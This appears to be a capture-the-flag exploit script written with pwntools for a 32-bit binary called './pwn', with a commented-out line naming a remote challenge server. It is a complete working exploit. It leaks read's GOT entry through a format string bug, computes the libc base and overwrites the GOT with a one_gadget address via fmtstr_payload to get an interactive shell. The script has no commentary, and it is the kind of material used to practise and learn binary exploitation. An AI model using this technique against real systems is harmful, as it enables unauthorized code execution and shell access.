from pwn import*
from LibcSearcher import LibcSearcher
context.log_level = "debug"
elf = ELF("./pwn")
libc = ELF("./libc_32.so.6")
# io = remote("114.67.246.176", 19546)
io = process('./pwn')
read_got = elf.got["read"]
pd = p32(read_got) + b"%6$s"
io.recvuntil("Do you know repeater?\n")
io.send(pd)
read_addr = u32(io.recv(8)[-4:])
print(hex(read_addr))
libc_base = read_addr - libc.sym["read"]
og = [0x3a822,0x3a829,0x5f075,0x5f076]
one_gadget = libc_base + og[3]
payload = fmtstr_payload(6,{read_got : one_gadget},write_size = "byte",)
io.send(payload)
io.interactive()